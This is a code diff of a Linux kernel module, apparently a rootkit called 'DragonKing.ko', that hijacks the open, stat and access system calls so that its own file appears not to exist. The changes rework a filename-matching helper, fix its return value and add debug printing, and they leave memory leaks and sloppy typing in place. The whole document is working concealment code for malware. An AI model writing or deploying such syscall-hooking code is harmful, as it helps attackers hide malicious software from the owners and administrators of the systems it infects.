@@ -22,20 +22,24 @@ const char * const FILES_TO_HIDE[] = {"DragonKing.ko"};
 //Is the string in a given list of strings?
 bool isHidden(const char __user *input){
 	char *kern_buff = NULL;
-	int i;
+        int i;
+        int ret = NULL;
+        kern_buff = kzalloc(strlen_user(input)+1, GFP_KERNEL);
+        copy_from_user(kern_buff, input, strlen_user(input));
 
-	kern_buff = kzalloc(strlen_user(input)+1, GFP_KERNEL);
-	copy_from_user(kern_buff, input, strlen_user(input));
+	printk("FILENAME: %s\n", kern_buff);
+        for(i = 0; i < sizeof(FILES_TO_HIDE)/sizeof(char *); i++){
 
-	bool ret = false;
-	for(i = 0; i < sizeof(FILES_TO_HIDE)/sizeof(char *); i++){
-		if(strcmp(kern_buff, FILES_TO_HIDE[i]) == 0){
-			ret = true;
-			return ret;
-		}
-	}
-	ret = true;
-	return ret;
+        if(strcmp(kern_buff, FILES_TO_HIDE[i]) == 0){
+        printk("%s matches %s", input, FILES_TO_HIDE[i]);
+        ret = true;
+        return ret;
+        } 
+
+        }
+
+        ret = false;
+        return ret;
 
 }
 
@@ -57,25 +61,16 @@ asmlinkage long (*orig_open)(const char __user *filename, int flags, umode_t mod
 
 asmlinkage long (*orig_stat)(const char __user *pathname, const struct stat __user *buf);
 
-asmlinkage long (*orig_fchownat)(const int __user dirfd, const char __user *pathname, const uid_t __user owner, const gid_t __user group, const int __user flags); 
-
 asmlinkage long (*orig_access)(const char __user *pathname, const int __user mode);
 
 
 asmlinkage int hacked_open(const char __user *filename, int flag, umode_t mode){
-	char *kern_buff = NULL;
-	int i;
 	int ret = NULL;
 
-	kern_buff = kzalloc(strlen_user(filename)+1, GFP_KERNEL);
-	copy_from_user(kern_buff, filename, strlen_user(filename));
-
-	for(i = 0; i < sizeof(FILES_TO_HIDE)/sizeof(char *); i++){
-	if(strcmp(kern_buff, FILES_TO_HIDE[i]) == 0){
+	if(isHidden(filename)){
 		ret = -ENOENT;
 		return ret;
-	}
-	}
+	}	
 
 	ret = (*orig_open)(filename, flag, mode);	
 	return ret;
